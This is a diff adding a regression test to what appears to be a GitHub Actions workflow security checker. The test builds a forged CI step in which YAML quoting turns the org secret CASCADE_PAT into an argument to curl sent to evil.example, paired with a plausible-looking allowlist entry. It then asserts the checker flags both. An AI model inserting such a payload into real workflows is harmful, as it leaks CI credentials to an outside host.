@@ -1335,6 +1335,61 @@ describe('G1 -- an exemption cannot follow its line into a different sink (#37)'
     );
   });
 
+  test('N-W1: a BRAND-NEW credential with a fresh, ordinary-looking entry reds -- nothing deleted', () => {
+    // THE SHAPE THAT MADE THE RESIDUE WIDER THAN ITS OWN DISCLOSURE, and the
+    // reason this case exists beside D1-D8 rather than inside them. Every row
+    // above RELOCATES an approved expression, so the exploit had to delete a
+    // real line from a workflow and recycle its entry -- a conspicuous diff,
+    // and the bound the old disclosure was read as stating. Phase 2 round 5
+    // measured that the bound does not hold: satisfy the count constraint by
+    // simply WRITING an entry, and then nothing is deleted at all.
+    //
+    // The payload and the entry below are the reviewer's, verbatim. Appended to
+    // the real `ci.yml` with no defang and no existing line touched, the
+    // org-level `CASCADE_PAT` lands in a bash command line -- Psych 5.3.1
+    // resolves `run` to `curl -H "X: token with: registry-url: ${{ ... }} "
+    // https://evil.example/x` -- and on `1a98115` the guarantee reported
+    // NOTHING: not an unpinned occurrence, not a dead entry, not a count
+    // disagreement. Suite 294 pass / 0 fail with the payload and the entry both
+    // committed (PR #38, Phase 2 round 5 N-W1).
+    //
+    // The entry is the point. It has a well-formed `why` naming its own
+    // reference, a plausible destination, and it looks exactly like the
+    // thirty-six good ones in the diff beside it. The `why` floor cannot refuse
+    // it, because the floor is a floor on form. What refuses it is the context:
+    // the forged line began inside an open double-quoted scalar, so its chain
+    // carries `(scalar)` and the entry cannot reach it.
+    const forged = appendStep(ci, step(
+      '      - name: Forged context dedent new expr',
+      '        run: "curl -H \\"X: token',
+      '        with:',
+      '          registry-url: ${{ secrets.CASCADE_PAT }}',
+      '        \\" https://evil.example/x"',
+    ));
+    const openersAdded = (forged.match(/\$\{\{/g) || []).length - (ci.match(/\$\{\{/g) || []).length;
+    assert.equal(openersAdded, 1, 'the payload introduces exactly one NEW occurrence, and deletes none');
+
+    const freshEntry = {
+      line: 'registry-url: ${{ secrets.CASCADE_PAT }}',
+      context: 'jobs > test > steps > with',
+      expression: '${{ secrets.CASCADE_PAT }}',
+      occurrences: 1,
+      why: 'secrets.CASCADE_PAT reaches the `registry-url:` input of actions/setup-node so private packages '
+        + 'resolve. An action input, not program text: the action receives it as a value and this workflow '
+        + 'builds no shell string from it.',
+    };
+    // The entry passes the shape floor on its own merits -- this is not a
+    // malformed-entry test, and if the floor ever started refusing it the case
+    // would be proving something else.
+    assert.deepEqual(entryShapeProblems('ci.yml', freshEntry), [], 'the forged entry is well-formed, which is why '
+      + 'the shape floor is not what catches it');
+
+    const withFresh = { ...EXPRESSION_ALLOWLIST, 'ci.yml': [...EXPRESSION_ALLOWLIST['ci.yml'], freshEntry] };
+    const problems = sweep('ci.yml', forged, withFresh);
+    assertReports(problems, UNPINNED, 'a NEW credential written into a forged context is not an action input');
+    assertReports(problems, DEAD, 'and the fresh entry written to cover it matches nothing, so it reads as dead');
+  });
+
   test('calibration: the discriminator does not red the five real workflows', () => {
     // THE COST OF THE ABOVE, MEASURED RATHER THAN ASSUMED. A rule that poisons
     // links is only free if no legitimate line trips it. `G1 -- green on the
